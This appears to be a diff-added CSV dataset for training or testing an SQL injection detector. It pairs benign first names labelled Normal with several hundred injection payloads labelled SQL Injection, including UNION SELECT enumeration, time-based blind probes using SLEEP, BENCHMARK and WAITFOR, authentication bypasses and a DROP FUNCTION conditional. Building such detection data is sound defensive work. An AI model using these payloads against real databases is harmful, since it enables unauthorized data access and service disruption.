+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'",SQL Injection
+'ORDER BY 26#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
+'' OR '1'='1',SQL Injection
+'David',Normal
+'Bob',Normal
+'\',SQL Injection
+'David',Normal
+'Eve',Normal
+'Eve',Normal
+'David',Normal
+'Charlie',Normal
+'Charlie',Normal
+'Bob',Normal
+'Fran',Normal
+'Fran',Normal
+'pg_SLEEP(5)#',SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
+'Charlie',Normal
+'Eve',Normal
+'Charlie',Normal
+"'"""" or """"""""^""""'",SQL Injection
+'Alice',Normal
+'Grace',Normal
+'Alice',Normal
+';%00	Nullbyte',SQL Injection
+'Hank',Normal
+'David',Normal
+'Grace',Normal
+'Grace',Normal
+'John',Normal
+'Bob',Normal
+'Hank',Normal
+'ORDER BY 26#',SQL Injection
+'Hank',Normal
+'Alice',Normal
+'ORDER BY 14',SQL Injection
+'Fran',Normal
+'``',SQL Injection
+'John',Normal
+'' GROUP BY columnnames having 1=1 --',SQL Injection
+'' GROUP BY columnnames having 1=1 --',SQL Injection
+'Eve',Normal
+'Comments:',SQL Injection
+'John',Normal
+'David',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
+'ORDER BY 2#',SQL Injection
+'Charlie',Normal
+'Hank',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5#'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+'Grace',Normal
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+"'-1' UNION SELECT 1,2,3--+'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'OR 1=0#',SQL Injection
+'John',Normal
+'Grace',Normal
+'Grace',Normal
+'or pg_SLEEP(5)#',SQL Injection
+'Fran',Normal
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
+'Grace',Normal
+"'"""" or """"""""&""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'Eve',Normal
+'UNION ALL SELECT 1',SQL Injection
+'ORDER BY 23#',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Charlie',Normal
+'OR 1=0--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'John',Normal
+'RANDOMBLOB(1000000000/2)',SQL Injection
+'Alice',Normal
+'Fran',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Jill',Normal
+"'""""""""'",SQL Injection
+'\\',SQL Injection
+'Alice',Normal
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+"'' or benchmark(10000000,MD5(1))#'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+'Fran',Normal
+'Jill',Normal
+'Eve',Normal
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'David',Normal
+'Alice',Normal
+'John',Normal
+'&&SLEEP(5)--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'1)) or pg_sleep(5)--',SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+"'SLEEP(5)=""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Eve',Normal
+'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
+'Bob',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Bob',Normal
+'Eve',Normal
+'UNION ALL SELECT 1',SQL Injection
+'Bob',Normal
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'Bob',Normal
+'admin' or 1=1--',SQL Injection
+'David',Normal
+'admin' or 1=1#',SQL Injection
+'David',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Jill',Normal
+'David',Normal
+'David',Normal
+'Jill',Normal
+'Jill',Normal
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+'Fran',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
+"'"""" or """"x""""=""""x'",SQL Injection
+'Bob',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'David',Normal
+'Eve',Normal
+'Eve',Normal
+"'"""";",SQL Injection
+'Bob',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'",SQL Injection
+"'and (select substring(@@version,1,1))='M''",SQL Injection
+'Jill',Normal
+'John',Normal
+'Jill',Normal
+'Fran',Normal
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
+'Fran',Normal
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'' or ''*'',SQL Injection
+'John',Normal
+'David',Normal
+"'admin"""") or """"1""""=""""1""""--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'Grace',Normal
+'Eve',Normal
+'Hank',Normal
+'John',Normal
+"'admin"""" or """"1""""=""""1'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'Eve',Normal
+'';WAITFOR DELAY '0:0:30'--',SQL Injection
+'Eve',Normal
+'John',Normal
+'ORDER BY 28--',SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+''-'',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#'",SQL Injection
+'AND 7506=9091 AND ('5913=5913',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'David',Normal
+'Hank',Normal
+'Fran',Normal
+"'-1' UNION SELECT 1,2,3--+'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'Jill',Normal
+'ORDER BY SLEEP(5)--',SQL Injection
+'ORDER BY 6--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
+'ORDER BY 5',SQL Injection
+'Jill',Normal
+'Jill',Normal
+'Eve',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'Fran',Normal
+'John',Normal
+'#	    Hash comment',SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'Alice',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'ORDER BY SLEEP(5)--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Grace',Normal
+'John',Normal
+'%		wildcard attribute indicator',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'John',Normal
+'Eve',Normal
+'Grace',Normal
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#'",SQL Injection
+'Hank',Normal
+'Jill',Normal
+'Fran',Normal
+'RANDOMBLOB(500000000/2)',SQL Injection
+'Eve',Normal
+'' or true--',SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
+'John',Normal
+'' AND 1=0 UNION ALL SELECT 'malicious_data',SQL Injection
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
+'ORDER BY 25--',SQL Injection
+"'') or benchmark(10000000,MD5(1))#'",SQL Injection
+'# from wapiti',SQL Injection
+'admin') or '1'='1'#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'Bob',Normal
+"'""""^""""'",SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Bob',Normal
+'Jill',Normal
+'Fran',Normal
+'pg_sleep(5)--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
+'ORDER BY 25--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
+'Grace',Normal
+'Bob',Normal
+Microservice running on port 5400,Normal
+'ORDER BY 12--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
+'admin' --',SQL Injection
+'Hank',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 1,2,3'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
+'Jill',Normal
+'John',Normal
+'admin' or '1'='1'/*',SQL Injection
+'Hank',Normal
+'Alice',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+'Charlie',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'David',Normal
+'Charlie',Normal
+'Alice',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'David',Normal
+'David',Normal
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Eve',Normal
+'Jill',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'",SQL Injection
+'Grace',Normal
+'John',Normal
+'Jill',Normal
+"'1' ORDER BY 1,2--+'",SQL Injection
+'ORDER BY 12--',SQL Injection
+'Bob',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'Hank',Normal
+'John',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
+"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Alice',Normal
+'Jill',Normal
+'Alice',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Alice',Normal
+'Grace',Normal
+'WHERE 1=1 AND 1=0--',SQL Injection
+'HAVING 1=1--',SQL Injection
+'Grace',Normal
+'Bob',Normal
+'Grace',Normal
+'Hank',Normal
+'Grace',Normal
+'Fran',Normal
+'Alice',Normal
+'ORDER BY 13#',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'' or '' '',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+'Eve',Normal
+'1 AND (SELECT * FROM Users) = 1',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'",SQL Injection
+'John',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+'John',Normal
+'Fran',Normal
+'John',Normal
+'John',Normal
+'Fran',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'Fran',Normal
+'ORDER BY 4#',SQL Injection
+'Jill',Normal
+"'and (select substring(@@version,3,1))='S''",SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'') or true--',SQL Injection
+'Grace',Normal
+'Grace',Normal
+'WHERE 1=1 AND 1=0',SQL Injection
+"'-1' UNION SELECT 1,2,3--+'",SQL Injection
+'John',Normal
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
+');,SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Jill',Normal
+'Bob',Normal
+'Fran',Normal
+'John',Normal
+'Eve',Normal
+'Eve',Normal
+'Jill',Normal
+"'1' GROUP BY 1,2,3--+'",SQL Injection
+'Hank',Normal
+'Fran',Normal
+'AND true',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
+'Alice',Normal
+'Fran',Normal
+'Alice',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
+'ORDER BY 1--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Jill',Normal
+'AND 1',SQL Injection
+'&&SLEEP(5)',SQL Injection
+'Eve',Normal
+"'"""")) or benchmark(10000000,MD5(1))#'",SQL Injection
+'Eve',Normal
+'Grace',Normal
+'OR 1=0--',SQL Injection
+'John',Normal
+'ORDER BY 13#',SQL Injection
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4#'",SQL Injection
+'Jill',Normal
+'ORDER BY 24#',SQL Injection
+"'1) or benchmark(10000000,MD5(1))#'",SQL Injection
+'Bob',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
+''&&SLEEP(5)&&'1',SQL Injection
+"'benchmark(50000000,MD5(1))'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--'",SQL Injection
+'Charlie',Normal
+"'"""") or true--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3'",SQL Injection
+'John',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+"'"""") or benchmark(10000000,MD5(1))#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+'Fran',Normal
+''LIKE'',SQL Injection
+'Eve',Normal
+'Charlie',Normal
+''',SQL Injection
+'Charlie',Normal
+"'""""""""'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),3,4--'",SQL Injection
+'Hank',Normal
+'Charlie',Normal
+'Alice',Normal
+'Eve',Normal
+'WHERE 1=1 AND 1=0#',SQL Injection
+'Bob',Normal
+"'and (select substring(@@version,3,1))='X''",SQL Injection
+'Jill',Normal
+'ORDER BY 16',SQL Injection
+'Jill',Normal
+'Grace',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+'''',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'",SQL Injection
+'Hank',Normal
+'Jill',Normal
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'David',Normal
+'Eve',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5'",SQL Injection
+'ORDER BY 28#',SQL Injection
+'John',Normal
+'Jill',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'')) or pg_sleep(5)--',SQL Injection
+'Jill',Normal
+'Eve',Normal
+"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
+'Bob',Normal
+'UNION ALL SELECT 1--',SQL Injection
+'Fran',Normal
+'Jill',Normal
+'John',Normal
+'Bob',Normal
+'Jill',Normal
+'Charlie',Normal
+'Fran',Normal
+'Alice',Normal
+'Charlie',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+"'""""'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'Eve',Normal
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
+'Bob',Normal
+'ORDER BY 29',SQL Injection
+'Eve',Normal
+'David',Normal
+'Hank',Normal
+'AND 7506=9091 AND (5913=5913',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Grace',Normal
+'John',Normal
+'John',Normal
+'Charlie',Normal
+'ORDER BY 14',SQL Injection
+'ORDER BY 8#',SQL Injection
+'Jill',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Jill',Normal
+'Hank',Normal
+'Alice',Normal
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'ORDER BY 24',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+'Hank',Normal
+'Hank',Normal
+'UNION ALL SELECT 1--',SQL Injection
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
+'ORDER BY 26',SQL Injection
+'ORDER BY 26#',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
+'1*56',SQL Injection
+''''''''''''''UNION SELECT '2',SQL Injection
+'David',Normal
+'Alice',Normal
+'Bob',Normal
+'Hank',Normal
+'Jill',Normal
+'Alice',Normal
+'Charlie',Normal
+'Charlie',Normal
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
+'Jill',Normal
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+''));,SQL Injection
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
+'David',Normal
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+'pg_SLEEP(5)#',SQL Injection
+'Charlie',Normal
+'David',Normal
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
+"'admin"""" or """"1""""=""""1'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+'Fran',Normal
